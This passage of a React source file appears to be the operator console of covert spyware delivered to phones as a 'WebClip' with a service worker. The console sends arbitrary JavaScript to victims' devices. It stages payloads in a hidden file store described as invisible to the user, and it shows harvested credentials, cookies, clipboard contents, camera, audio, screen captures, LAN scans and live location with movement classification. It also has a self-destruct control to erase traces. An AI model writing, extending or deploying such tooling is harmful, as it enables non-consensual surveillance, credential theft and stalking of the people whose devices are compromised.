          <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4 }}>{status.last_js_result.ok ? '▶ result' : '✗ error'}</div>
          {status.last_js_result.result}
        </div>
      )}

      {/* Run JS inline editor */}
      <div style={{ marginBottom: 12 }}>
        <textarea
          value={jsCode}
          onChange={e => setJsCode(e.target.value)}
          placeholder="// JS to run on device&#10;return navigator.userAgent;"
          rows={3}
          style={{
            width: '100%', boxSizing: 'border-box', background: '#0c0d1a', border: '1px solid #3a3a3c',
            borderRadius: 8, color: '#c9d1e8', fontFamily: 'monospace', fontSize: 12,
            padding: '8px 10px', resize: 'vertical', outline: 'none',
          }}
        />
        <div style={{ display: 'flex', gap: 8, marginTop: 6 }}>
          <button
            disabled={cmdLoading || !jsCode.trim()}
            onClick={() => { if (jsCode.trim()) sendCmd('run_js', { code: jsCode.trim() }); }}
            style={_b('#a78bfa', cmdLoading || !jsCode.trim())}
          >▶ Run JS</button>
          <button
            disabled={cmdLoading}
            onClick={() => sendCmd('ping')}
            style={_b('#3b82f6', cmdLoading)}
          >Ping</button>
          <button
            disabled={cmdLoading}
            onClick={() => sendCmd('reload')}
            style={_b('#4e5a70', cmdLoading)}
          >Reload</button>
          <button
            onClick={() => setShowDestruct(true)}
            disabled={cmdLoading || !!status?.self_destruct_sent}
            style={{ ..._b('transparent', cmdLoading || !!status?.self_destruct_sent), border: '1px solid #ff453a', color: (cmdLoading || !!status?.self_destruct_sent) ? '#4e5a70' : '#ef4444', marginLeft: 'auto' }}
          >☢️</button>
        </div>
      </div>

      {/* OPFS File Manager */}
      {(() => {
        const [opfsFile, setOpfsFile]         = React.useState('');
        const [opfsContent, setOpfsContent]   = React.useState('');
        const [opfsEncoding, setOpfsEncoding] = React.useState('text');
        const [opfsUploadName, setOpfsUploadName] = React.useState('');
        const lastOpfs = ['opfs_list','opfs_read','opfs_write','opfs_delete'].reduce((acc, k) => status?.harvests?.[k] ? status.harvests[k] : acc, null);

        const _renderOpfsResult = (res) => {
          if (!res) return null;
          const d = res.data;
          // Read result with base64 - try to decode as text, else offer download
          if (d?.content_b64) {
            let text = null;
            try { text = decodeURIComponent(escape(atob(d.content_b64))); } catch {}
            return (
              <div style={{ marginTop: 8 }}>
                <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4 }}>{d.filename} - {d.size} bytes</div>
                {text !== null ? (
                  <pre style={{ margin: 0, padding: '8px', background: '#07080f', borderRadius: 6, fontSize: 11, color: '#22c55e', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 200, overflowY: 'auto' }}>{text}</pre>
                ) : (
                  <a href={`data:application/octet-stream;base64,${d.content_b64}`} download={d.filename}
                    style={{ fontSize: 12, color: '#3b82f6' }}>⬇ Download {d.filename}</a>
                )}
              </div>
            );
          }
          return <pre style={{ margin: '8px 0 0', padding: '8px', background: '#07080f', borderRadius: 6, fontSize: 11, color: '#c9d1e8', fontFamily: 'monospace', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 160, overflowY: 'auto' }}>{JSON.stringify(d, null, 2)}</pre>;
        };

        return (
          <div style={{ marginBottom: 12, padding: '10px 12px', borderRadius: 8, background: '#0c0d1a', border: '1px solid #3a3a3c' }}>
            {/* Explanation */}
            <div style={{ marginBottom: 10, padding: '8px 10px', borderRadius: 6, background: '#141728', border: '1px solid #3a3a5c', fontSize: 11, color: '#c9d1e8', lineHeight: 1.6 }}>
              <strong style={{ color: '#c9d1e8' }}>OPFS (Origin Private File System)</strong> - a hidden folder on the device, invisible to the user and to the Files app. Only this WebClip can access it. Use it to stage payloads, accumulate collected data, or persist config across SW updates. Files survive app restarts and SW version changes.
            </div>
            <div style={{ fontSize: 11, color: '#4e5a70', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 8 }}>📁 OPFS File Manager</div>
            <input
              value={opfsFile}
              onChange={e => setOpfsFile(e.target.value)}
              placeholder="filename (e.g. payload.js)"
              style={{ width: '100%', boxSizing: 'border-box', background: '#07080f', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontSize: 12, padding: '6px 8px', marginBottom: 6, outline: 'none' }}
            />
            {/* File upload or text */}
            <div style={{ display: 'flex', gap: 6, marginBottom: 6, alignItems: 'center' }}>
              <label style={{ fontSize: 11, color: '#4e5a70', cursor: 'pointer', padding: '6px 10px', borderRadius: 6, border: '1px solid #3a3a3c', background: '#07080f', whiteSpace: 'nowrap' }}>
                📎 Upload file
                <input type="file" style={{ display: 'none' }} onChange={async e => {
                  const file = e.target.files[0];
                  if (!file) return;
                  if (!opfsFile) setOpfsFile(file.name);
                  setOpfsUploadName(file.name);
                  const buf = await file.arrayBuffer();
                  const bytes = new Uint8Array(buf);
                  let b64 = '';
                  const CHUNK = 8192;
                  for (let i = 0; i < bytes.length; i += CHUNK) b64 += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
                  setOpfsContent(btoa(b64));
                  setOpfsEncoding('base64');
                }} />
              </label>
              {opfsUploadName && <span style={{ fontSize: 11, color: '#22c55e' }}>✓ {opfsUploadName}</span>}
              {!opfsUploadName && (
                <textarea
                  value={opfsEncoding === 'text' ? opfsContent : ''}
                  onChange={e => { setOpfsContent(e.target.value); setOpfsEncoding('text'); }}
                  placeholder="or paste text content"
                  rows={2}
                  style={{ flex: 1, background: '#07080f', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontFamily: 'monospace', fontSize: 12, padding: '6px 8px', resize: 'vertical', outline: 'none' }}
                />
              )}
              {opfsUploadName && <button onClick={() => { setOpfsUploadName(''); setOpfsContent(''); setOpfsEncoding('text'); }} style={{ ..._b('transparent', false), border: '1px solid #636366', color: '#4e5a70', padding: '4px 8px', fontSize: 11 }}>Clear</button>}
            </div>
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
              <button disabled={cmdLoading} onClick={() => sendCmd('opfs_list')} style={_b('#10121f', cmdLoading)}>List</button>
              <button disabled={cmdLoading || !opfsFile.trim() || !opfsContent} onClick={() => sendCmd('write_opfs', { filename: opfsFile.trim(), content: opfsContent, encoding: opfsEncoding })} style={_b('rgba(34,197,94,0.09)', cmdLoading || !opfsFile.trim() || !opfsContent)}>Write</button>
              <button disabled={cmdLoading || !opfsFile.trim()} onClick={() => sendCmd('read_opfs', { filename: opfsFile.trim() })} style={_b('#10121f', cmdLoading || !opfsFile.trim())}>Read</button>
              <button disabled={cmdLoading || !opfsFile.trim()} onClick={() => sendCmd('delete_opfs', { filename: opfsFile.trim() })} style={{ ..._b('transparent', cmdLoading || !opfsFile.trim()), border: '1px solid rgba(239,68,68,0.27)', color: (cmdLoading || !opfsFile.trim()) ? '#4e5a70' : '#ef4444' }}>Delete</button>
            </div>
            {_renderOpfsResult(lastOpfs)}
          </div>
        );
      })()}

      {/* Badge + other harvest */}
      <div style={{ marginBottom: 12 }}>
        <div style={{ fontSize: 11, color: '#4e5a70', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 6 }}>Harvest</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          {(() => {
            const [badgeVal, setBadgeVal] = React.useState('0');
            const n = parseInt(badgeVal, 10);
            const valid = !isNaN(n) && n >= 0;
            return (
              <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                <input
                  type="number" min="0" value={badgeVal}
                  onChange={e => setBadgeVal(e.target.value)}
                  style={{ width: 60, background: '#0c0d1a', border: '1px solid #3a3a3c', borderRadius: 6, color: '#c9d1e8', fontSize: 12, padding: '6px 8px', outline: 'none', textAlign: 'center' }}
                />
                <button
                  disabled={cmdLoading || !valid}
                  onClick={() => sendCmd('set_badge', { n })}
                  style={_b('rgba(245,158,11,0.09)', cmdLoading || !valid)}
                >🔴 {n === 0 ? 'Clear Badge' : `Set Badge`}</button>
              </div>
            );
          })()}
        </div>
      </div>

      {/* Harvest results */}
      {status?.harvests && Object.keys(status.harvests).length > 0 && (
        <div style={{ marginBottom: 12 }}>
          <div style={{ fontSize: 11, color: '#4e5a70', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 6 }}>Harvest Results</div>
          {Object.entries(status.harvests).map(([type, { data, ts }]) => (
            <div key={type} style={{ marginBottom: 8, borderRadius: 8, border: '1px solid #3a3a3c', overflow: 'hidden' }}>
              <div style={{ padding: '6px 10px', background: '#141728', display: 'flex', justifyContent: 'space-between', fontSize: 11 }}>
                <span style={{ color: '#3b82f6', fontWeight: 700 }}>{type}</span>
                <span style={{ color: '#4e5a70' }}>{ts ? new Date(ts < 1e12 ? ts * 1000 : ts).toLocaleTimeString() : ''}</span>
              </div>
              <pre style={{
                margin: 0, padding: '8px 10px', background: '#0c0d1a', color: '#c9d1e8',
                fontSize: 11, fontFamily: 'monospace', whiteSpace: 'pre-wrap',
                wordBreak: 'break-all', maxHeight: 200, overflowY: 'auto',
              }}>{JSON.stringify(data, null, 2)}</pre>
            </div>
          ))}
        </div>
      )}

      {/* Flash */}
      {flashMsg && (
        <div style={{
          marginBottom: 10, padding: '8px 12px', borderRadius: 8, fontSize: 13,
          background: flashMsg.ok ? 'rgba(34,197,94,0.09)' : 'rgba(239,68,68,0.09)',
          border: `1px solid ${flashMsg.ok ? '#22c55e' : '#ef4444'}`,
          color: flashMsg.ok ? '#22c55e' : '#ef4444',
        }}>{flashMsg.ok ? '✓ ' : '✗ '}{flashMsg.msg}</div>
      )}

      {/* Command log */}
      {cmdLog.length > 0 && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
          {cmdLog.map((e, i) => (
            <div key={i} style={{ display: 'flex', gap: 10, padding: '6px 10px', borderRadius: 8, background: '#0c0d1a', fontSize: 12 }}>
              <code style={{ color: '#3b82f6', flex: 1 }}>{e.type}</code>
              <span style={{ color: e.ok ? '#22c55e' : '#ef4444' }}>{e.ok ? 'sent' : 'failed'}</span>
              <span style={{ color: '#4e5a70' }}>{new Date(e.ts).toLocaleTimeString()}</span>
            </div>
          ))}
        </div>
      )}

      {/* Self-destruct modal */}
      {showDestruct && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
          <div style={{ background: '#07080f', border: '1px solid #ff453a', borderRadius: 16, padding: 28, width: 340 }}>
            <div style={{ fontSize: 28, marginBottom: 8 }}>☢️</div>
            <h3 style={{ margin: '0 0 8px', color: '#ef4444', fontSize: 18 }}>Self-Destruct</h3>
            <p style={{ fontSize: 13, color: '#ebebf5aa', margin: '0 0 16px' }}>
              The Service Worker will unregister and clear all caches. This cannot be undone.
            </p>
            <div style={{ display: 'flex', gap: 10 }}>
              <button onClick={() => setShowDestruct(false)} style={{ padding: '9px 18px', borderRadius: 10, border: 'none', background: 'rgba(255,255,255,0.09)', color: '#c9d1e8', fontSize: 14, fontWeight: 600, cursor: 'pointer' }}>Cancel</button>
              <button onClick={handleDestruct} disabled={destructLoading} style={{ padding: '9px 18px', borderRadius: 10, border: 'none', background: destructLoading ? 'rgba(255,255,255,0.09)' : '#ef4444', color: destructLoading ? '#4e5a70' : '#fff', fontSize: 14, fontWeight: 600, cursor: destructLoading ? 'not-allowed' : 'pointer' }}>
                {destructLoading ? 'Sending…' : 'Destroy SW'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function ConsolePanel({ events }) {
  const LEVEL_COLOR = { log: '#4e5a70', warn: '#f59e0b', error: '#ef4444', info: '#3b82f6' };
  const logs = events
    .filter(e => e.type === 'console_log')
    .map(e => {
      const raw = e.data ?? e.data_json;
      const d = typeof raw === 'string' ? (() => { try { return JSON.parse(raw); } catch { return { level: 'log', msg: raw }; } })() : (raw ?? {});
      return { ...d, id: e.id, timestamp: e.timestamp };
    });
  // events are DESC (newest first), so logs[0] is newest
  return (
    <div style={{ fontFamily: 'ui-monospace, monospace', fontSize: 12, minHeight: 120 }}>
      {logs.length === 0 && (
        <div style={{ color: 'rgba(255,255,255,0.09)', padding: '20px 16px' }}>No console output yet - send a JS command that logs something.</div>
      )}
      {logs.map(log => (
        <div key={log.id} style={{
          borderBottom: '1px solid #111', padding: '5px 14px',
          display: 'flex', gap: 10, alignItems: 'baseline',
        }}>
          <span style={{ color: 'rgba(255,255,255,0.09)', fontSize: 10, flexShrink: 0 }}>
            {log.timestamp ? parseUTC(log.timestamp)?.toLocaleTimeString('en-IL', { timeZone: 'Asia/Jerusalem', hour12: false }) : ''}
          </span>
          <span style={{
            color: LEVEL_COLOR[log.level] ?? '#4e5a70', fontSize: 10, fontWeight: 700,
            textTransform: 'uppercase', flexShrink: 0, width: 34,
          }}>
            {log.level ?? 'log'}
          </span>
          <span style={{ color: '#c9d1e8', flex: 1, whiteSpace: 'pre-wrap', wordBreak: 'break-all', lineHeight: 1.5 }}>
            {log.msg ?? ''}
          </span>
        </div>
      ))}
    </div>
  );
}

function JSExecutor({ deviceId, events, onSent, onFastPoll }) {
  const [code, setCode] = useState('');
  const [phase, setPhase] = useState('idle'); // 'idle' | 'posting' | 'waiting'
  const [sentAt, setSentAt] = useState(null);
  const [timedOut, setTimedOut] = useState(false);
  const timeoutRef = useRef(null);

  const resultEvent = events?.find(e => e.type === 'js_result' && sentAt && parseUTC(e.timestamp)?.getTime() >= sentAt - 3000);
  const resultData = resultEvent ? parseEvent(resultEvent) : null;
  const resultKey = resultEvent?.id ?? null;

  useEffect(() => {
    if (resultKey && phase === 'waiting') {
      clearTimeout(timeoutRef.current);
      setTimedOut(false);
      setPhase('idle');
    }
  }, [resultKey]);

  async function run() {
    if (!code.trim() || phase !== 'idle') return;
    setPhase('posting');
    setTimedOut(false);
    const ts = Date.now();
    setSentAt(ts);
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'run_js', payload: { code } }),
      });
      onSent?.();
      onFastPoll?.();
      setPhase('waiting');
      timeoutRef.current = setTimeout(() => {
        setPhase('idle');
        setTimedOut(true);
      }, 15000);
    } catch (e) {
      alert(`Failed: ${e.message}`);
      setPhase('idle');
    }
  }

  const busy = phase !== 'idle';
  const btnLabel = phase === 'posting' ? 'Sending…' : phase === 'waiting' ? 'Waiting…' : 'Run';

  return (
    <>
      <textarea
        value={code}
        onChange={e => setCode(e.target.value)}
        onKeyDown={e => { if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) run(); }}
        placeholder={'// JavaScript - runs in WebClip context\nreturn navigator.userAgent;'}
        spellCheck={false}
        style={{
          width: '100%', boxSizing: 'border-box', minHeight: 120,
          background: '#07080f', border: 'none', borderBottom: '1px solid #2c2c2e',
          color: '#c9d1e8', fontSize: 12, fontFamily: 'monospace', padding: '12px 14px',
          resize: 'vertical', outline: 'none',
        }}
      />
      <div style={{ padding: '8px 14px', display: 'flex', justifyContent: 'flex-end', gap: 8, alignItems: 'center' }}>
        {timedOut && !resultData && (
          <pre style={{ flex: 1, margin: 0, fontSize: 11, fontFamily: 'monospace', color: '#f59e0b' }}>Timeout - device offline or not running WebClip</pre>
        )}
        {resultData && (
          <pre style={{
            flex: 1, margin: 0, fontSize: 11, fontFamily: 'monospace', whiteSpace: 'pre-wrap',
            wordBreak: 'break-all', color: resultData.ok === false ? '#ef4444' : '#22c55e',
          }}>{resultData.ok === false ? `Error: ${resultData.error}` : resultData.result}</pre>
        )}
        <button onClick={run} disabled={busy || !code.trim()} style={{
          padding: '5px 14px', borderRadius: 8, border: 'none', fontSize: 12, fontWeight: 600,
          background: busy ? 'rgba(245,158,11,0.13)' : '#3b82f6', color: busy ? '#f59e0b' : '#fff',
          cursor: busy || !code.trim() ? 'default' : 'pointer', opacity: !code.trim() ? 0.4 : 1, flexShrink: 0,
        }}>{btnLabel}</button>
      </div>
    </>
  );
}

const INTEL_GROUPS = [
  { id: 'credentials', label: 'Credentials',       icon: '🔑', color: '#ef4444' },
  { id: 'lan',         label: 'LAN Hosts',         icon: '🌐', color: '#22c55e' },
  { id: 'portscan',    label: 'Open Ports',        icon: '🔌', color: '#f59e0b' },
  { id: 'geo',         label: 'Location',         icon: '📍', color: '#22c55e' },
  { id: 'cookies',     label: 'Cookies',          icon: '🍪', color: '#f59e0b' },
  { id: 'storage',     label: 'Storage',          icon: '💾', color: '#a78bfa' },
  { id: 'gpu',         label: 'GPU',              icon: '🎮', color: '#3b82f6' },
  { id: 'audio',       label: 'Audio Recordings', icon: '🎙️', color: '#f59e0b' },
  { id: 'video',       label: 'Live Recordings',  icon: '🎬', color: '#ef4444' },
  { id: 'screenshot',  label: 'Screenshots',      icon: '🖥',  color: '#3b82f6' },
  { id: 'camera',      label: 'Camera',           icon: '📷', color: '#3b82f6' },

  { id: 'filesystem',  label: 'File/Photo Uploads', icon: '📁', color: '#f59e0b' },
  { id: 'clipboard',   label: 'Clipboard',        icon: '📋', color: '#f59e0b' },
  { id: 'motion',      label: 'Motion',           icon: '📳', color: '#a78bfa' },
];

function parseData(raw) {
  if (!raw) return {};
  if (typeof raw === 'object') return raw;
  try { return JSON.parse(raw); } catch { return {}; }
}

function GlobalClearMenu({ deviceId, onDone }) {
  const [open, setOpen] = useState(false);
  const ref = useRef(null);
  useEffect(() => {
    if (!open) return;
    function handler(e) { if (ref.current && !ref.current.contains(e.target)) setOpen(false); }
    document.addEventListener('mousedown', handler);
    return () => document.removeEventListener('mousedown', handler);
  }, [open]);
  async function clear(keepLast) {
    setOpen(false);
    await apiFetch(`/api/devices/${deviceId}/intelligence/clear`, {
      method: 'POST',
      body: JSON.stringify({ group: 'all', keep_last: keepLast }),
    });
    onDone();
  }
  return (
    <div ref={ref} style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: 16, position: 'relative' }}>
      <button
        onClick={() => setOpen(o => !o)}
        style={{
          display: 'flex', alignItems: 'center', gap: 6,
          padding: '5px 14px', borderRadius: 8, border: '1px solid rgba(239,68,68,0.27)',
          background: 'rgba(239,68,68,0.07)', color: '#ef4444', fontSize: 12, fontWeight: 600, cursor: 'pointer',
        }}
      >
        🗑 Clear All Intelligence
      </button>
      {open && (
        <div style={{
          position: 'absolute', right: 0, top: 34, zIndex: 100,
          background: '#141728', border: '1px solid #ff453a33', borderRadius: 10,
          padding: 6, display: 'flex', flexDirection: 'column', gap: 4, minWidth: 220,
          boxShadow: '0 8px 24px #00000066',
        }}>
          <button onClick={() => clear(false)} style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer', textAlign: 'left' }}>
            🗑 Delete all intelligence
          </button>
          <button onClick={() => clear(true)} style={{ background: 'rgba(245,158,11,0.09)', border: 'none', color: '#f59e0b', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer', textAlign: 'left' }}>
            Keep last of each type
          </button>
        </div>
      )}
    </div>
  );
}

function ClearMenu({ groupId, groupLabel, deviceId, onDone }) {
  const [open, setOpen] = useState(false);
  const ref = useRef(null);
  useEffect(() => {
    if (!open) return;
    function handler(e) { if (ref.current && !ref.current.contains(e.target)) setOpen(false); }
    document.addEventListener('mousedown', handler);
    return () => document.removeEventListener('mousedown', handler);
  }, [open]);
  async function clear(keepLast) {
    setOpen(false);
    await apiFetch(`/api/devices/${deviceId}/intelligence/clear`, {
      method: 'POST',
      body: JSON.stringify({ group: groupId, keep_last: keepLast }),
    });
    onDone();
  }
  return (
    <div ref={ref} style={{ position: 'relative' }}>
      <button onClick={e => { e.stopPropagation(); setOpen(o => !o); }}
        style={{ background: 'transparent', border: '1px solid #2c2c2e', color: '#4e5a70', borderRadius: 6, padding: '2px 8px', fontSize: 11, cursor: 'pointer' }}>
        ⊘ Clear
      </button>
      {open && (
        <div style={{
          position: 'absolute', right: 0, top: 26, zIndex: 100,
          background: '#141728', border: '1px solid #2c2c2e', borderRadius: 10,
          padding: 6, display: 'flex', flexDirection: 'column', gap: 4, minWidth: 200,
          boxShadow: '0 8px 24px #00000066',
        }}>
          <div style={{ fontSize: 10, color: '#4e5a70', padding: '2px 8px', textTransform: 'uppercase', letterSpacing: '0.06em' }}>{groupLabel}</div>
          <button onClick={() => clear(false)} style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '6px 12px', fontSize: 12, cursor: 'pointer', textAlign: 'left' }}>
            Delete all {groupLabel}
          </button>
          <button onClick={() => clear(true)} style={{ background: 'rgba(245,158,11,0.09)', border: 'none', color: '#f59e0b', borderRadius: 6, padding: '6px 12px', fontSize: 12, cursor: 'pointer', textAlign: 'left' }}>
            Keep last {groupLabel}
          </button>
        </div>
      )}
    </div>
  );
}

const GEO_SOURCE_META = {
  gps_high: { label: '🛰 GPS High',  color: '#22c55e' },
  gps_low:  { label: '📡 GPS Low',   color: '#f59e0b' },
  ip:       { label: '🌐 IP',        color: '#f59e0b' },
};

function DelBtn({ onClick }) {
  return (
    <button onClick={async () => { if (window.confirm('Are you sure? This action is irreversible.')) await onClick(); }}
      style={{ background: 'rgba(239,68,68,0.13)', border: 'none', color: '#ef4444', borderRadius: 6, padding: '3px 9px', fontSize: 11, cursor: 'pointer', flexShrink: 0 }}>
      ✕
    </button>
  );
}

function GeoItem({ item, rowStyle, dateStr, timeStr, latestBadge, deviceId, onLoad }) {
  const d = parseData(item.raw.data_json);
  const lat = d.lat ?? d.latitude;
  const lon = d.lon ?? d.longitude ?? d.lng;
  const acc = d.accuracy != null ? Math.round(d.accuracy) : null;
  const alt = d.altitude != null ? Math.round(d.altitude) : null;
  const altAcc = d.altitudeAccuracy != null ? Math.round(d.altitudeAccuracy) : null;
  const speed = d.speed != null ? Math.round(d.speed * 3.6) : null;
  const heading = d.heading != null ? Math.round(d.heading) : null;
  const source = d.source ?? null;
  const srcMeta = source ? GEO_SOURCE_META[source] : null;
  const geoMode = d.mode ?? null;
  const modeBadge = geoMode === 'once' ? { label: '📍 Once', color: '#4e5a70' }
    : geoMode === 'watch' ? { label: (d.duration || d.interval) ? `🔄 ${d.duration || d.interval}s` : '🔄 Live', color: '#a78bfa' }
    : null;
  // Computed after addrLine is known - see render
  const coordsUrl = lat && lon ? `https://maps.google.com/maps?q=${lat},${lon}&z=17` : null;

  // For IP source, data already carries city/country - skip Nominatim
  const ipAddr = source === 'ip' && d.city ? [d.city, d.region, d.country].filter(Boolean).join(', ') : null;

  const [addr, setAddr] = useState(null);
  useEffect(() => {
    if (source === 'ip' || lat == null || lon == null) return;
    const key = `geo_addr_v3_${Number(lat).toFixed(5)}_${Number(lon).toFixed(5)}`;
    const cached = sessionStorage.getItem(key);
    if (cached) { setAddr(JSON.parse(cached)); return; }
    apiFetch(`/api/geocode/reverse?lat=${lat}&lon=${lon}`)
      .then(result => {
        sessionStorage.setItem(key, JSON.stringify(result));
        setAddr(result);
      })
      .catch(() => {});
  }, [lat, lon, source]);

  const addrLine = ipAddr ?? (addr ? [
    addr.road ? addr.road + (addr.houseNumber ? ' ' + addr.houseNumber : '') : null,
    addr.city, addr.country,
  ].filter(Boolean).join(', ') : null);

  return (
    <div style={{ ...rowStyle, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
      <div style={{ flex: 1 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <span style={{ fontSize: 11, color: '#4e5a70' }}>{dateStr} {timeStr}{latestBadge}</span>
          {srcMeta && (
            <span style={{ fontSize: 9, fontWeight: 700, color: srcMeta.color, background: srcMeta.color + '22', borderRadius: 4, padding: '1px 6px', letterSpacing: '0.04em' }}>
              {srcMeta.label}
            </span>
          )}
          {modeBadge && (
            <span style={{ fontSize: 9, fontWeight: 700, color: modeBadge.color, background: modeBadge.color + '22', borderRadius: 4, padding: '1px 6px', letterSpacing: '0.04em' }}>
              {modeBadge.label}
            </span>
          )}
        </div>
        <div style={{ fontSize: 13, color: '#c9d1e8', marginTop: 4, fontVariantNumeric: 'tabular-nums', fontFamily: 'monospace' }}>
          {lat != null && lon != null
            ? <>{Number(lat).toFixed(6)}, {Number(lon).toFixed(6)}</>
            : <span style={{ color: '#4e5a70' }}>No coordinates</span>}
        </div>
        {addrLine && (
          <div style={{ fontSize: 12, color: '#3b82f6', marginTop: 3 }}>{addrLine}</div>
        )}
        {source === 'ip' && d.ip && (
          <div style={{ fontSize: 11, color: '#4e5a70', marginTop: 2, fontFamily: 'monospace' }}>IP: {d.ip}</div>
        )}
        <div style={{ display: 'flex', gap: 12, marginTop: 4, flexWrap: 'wrap' }}>
          {acc != null && <span style={{ fontSize: 11, color: '#4e5a70' }}>±{acc}m</span>}
          {alt != null && <span style={{ fontSize: 11, color: '#4e5a70' }}>↑{alt}m{altAcc != null ? ` ±${altAcc}m` : ''}</span>}
          {speed != null && <span style={{ fontSize: 11, color: '#4e5a70' }}>{speed} km/h</span>}
          {heading != null && <span style={{ fontSize: 11, color: '#4e5a70' }}>{heading}°</span>}
        </div>
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'flex-end' }}>
        {coordsUrl && (
          <a href={coordsUrl}
            target="_blank" rel="noreferrer"
            style={{ background: 'rgba(59,130,246,0.13)', color: '#3b82f6', borderRadius: 6, padding: '4px 10px', fontSize: 11, fontWeight: 600, textDecoration: 'none', flexShrink: 0 }}
          >Maps ↗</a>
        )}
        <DelBtn onClick={async () => { await apiFetch(`/api/devices/${deviceId}/events/${item.raw.id}`, { method: 'DELETE' }); onLoad(); }} />
      </div>
    </div>
  );
}

// --- Geo intelligence helpers ---

function haversineKm(lat1, lon1, lat2, lon2) {
  const R = 6371;
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

function classifyMovement(pings) {
  const valid = pings.filter(p => p.lat != null && p.lon != null).sort((a,b) => (a.ts?.getTime()??0)-(b.ts?.getTime()??0));
  if (valid.length < 2) return { icon: '📍', label: 'Single ping', color: '#4e5a70' };

  let totalDistKm = 0;
  for (let i = 1; i < valid.length; i++)
    totalDistKm += haversineKm(valid[i-1].lat, valid[i-1].lon, valid[i].lat, valid[i].lon);

  const maxDisp = Math.max(...valid.slice(1).map(p => haversineKm(valid[0].lat, valid[0].lon, p.lat, p.lon)));
  if (maxDisp < 0.05) return { icon: '🏠', label: 'Stationary', color: '#22c55e' };

  const speeds = pings.map(p => p.speed).filter(s => s != null && s >= 0);
  let avgKmh;
  if (speeds.length >= Math.ceil(pings.length * 0.5)) {
    avgKmh = (speeds.reduce((s,v) => s+v, 0) / speeds.length) * 3.6;
  } else {
    const durationH = (valid[valid.length-1].ts - valid[0].ts) / 3600000;
    avgKmh = durationH > 0 ? totalDistKm / durationH : 0;
  }

  if (avgKmh < 3)   return { icon: '🏠', label: 'Stationary', color: '#22c55e' };
  if (avgKmh < 8)   return { icon: '🚶', label: 'Walking',    color: '#f59e0b' };
  if (avgKmh < 18)  return { icon: '🏃', label: 'Running',    color: '#f59e0b' };
  if (avgKmh < 35)  return { icon: '🚲', label: 'Cycling',    color: '#3b82f6' };
  if (avgKmh < 150) return { icon: '🚗', label: 'Driving',    color: '#a78bfa' };
  return { icon: '✈️', label: 'Fast travel', color: '#a78bfa' };
}

function buildGeoSessions(geoItems) {
  const sorted = [...geoItems].sort((a,b) => (a.ts?.getTime()??0)-(b.ts?.getTime()??0));
  const GAP_MS = 30 * 60 * 1000;
  const result = [];
  let session = null;
  for (const item of sorted) {
    const mode = (parseData(item.raw.data_json)).mode ?? null;
    if (mode === 'once' || mode === null) {
      if (session) { result.push({ type: 'session', items: session }); session = null; }
      result.push({ type: 'once', items: [item] });
    } else {
      if (!session) { session = [item]; }
      else {
        const gap = (item.ts?.getTime()??0) - (session[session.length-1].ts?.getTime()??0);
        if (gap > GAP_MS) { result.push({ type: 'session', items: session }); session = [item]; }
        else session.push(item);
      }
    }
  }
  if (session) result.push({ type: 'session', items: session });
  return result.reverse();
}

function GeoIntelSession({ items, isLatest, deviceId, onLoad }) {
  const sorted = [...items].sort((a,b) => (a.ts?.getTime()??0)-(b.ts?.getTime()??0));
  const pings = sorted.map(item => {
    const d = parseData(item.raw.data_json);
    return { lat: d.lat ?? d.latitude, lon: d.lon ?? d.longitude ?? d.lng, speed: d.speed, ts: item.ts };
  });
  const first = sorted[0], last = sorted[sorted.length-1];
  const firstD = parseData(first.raw.data_json);
  const lastD  = parseData(last.raw.data_json);
  const startLat = firstD.lat ?? firstD.latitude, startLon = firstD.lon ?? firstD.longitude ?? firstD.lng;
  const endLat   = lastD.lat  ?? lastD.latitude,  endLon   = lastD.lon  ?? lastD.longitude  ?? lastD.lng;

  const movement = classifyMovement(pings);
  const validPings = pings.filter(p => p.lat != null && p.lon != null);
  let totalDistKm = 0;
  for (let i = 1; i < validPings.length; i++)
    totalDistKm += haversineKm(validPings[i-1].lat, validPings[i-1].lon, validPings[i].lat, validPings[i].lon);

  const startTimeStr = first.ts?.toLocaleTimeString('en-IL', { timeZone: 'Asia/Jerusalem', hour: '2-digit', minute: '2-digit' }) ?? '-';
  const endTimeStr   = last.ts?.toLocaleTimeString('en-IL',  { timeZone: 'Asia/Jerusalem', hour: '2-digit', minute: '2-digit' }) ?? '-';
  const dateStr      = first.ts?.toLocaleDateString('en-IL', { timeZone: 'Asia/Jerusalem' }) ?? '';
  const durationMin  = first.ts && last.ts ? Math.round((last.ts - first.ts) / 60000) : null;

  const sessionMode = firstD.mode ?? null;
  const sessionDuration = firstD.duration ?? firstD.interval ?? null;
